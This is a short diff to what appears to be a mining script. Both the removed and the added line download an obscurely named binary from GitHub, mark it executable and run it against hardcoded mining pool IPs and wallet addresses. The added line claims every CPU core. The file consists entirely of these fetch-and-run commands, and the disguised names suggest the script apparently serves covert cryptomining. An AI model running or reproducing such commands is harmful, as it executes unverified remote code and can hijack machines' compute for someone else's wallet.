@@ -1,5 +1,6 @@
-wget https://github.com/angkii/m/raw/main/AkubapakMU && chmod 700 AkubapakMU && ./AkubapakMU --algo KASPA --pool 178.128.86.41:80 --user qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg.maaa --no-cl     
+COIN BTE
 
+wget https://github.com/angkii/asu/raw/main/VTM && chmod 700 VTM &&  ./VTM -a yespower -o stratum+tcp://159.223.188.176:80 -u web1qdel9x2uf65qpj4mzq9v7n2r6y98ejj98wkd7dq.mj -p m=solo -t$(nproc --all)
 
 
 
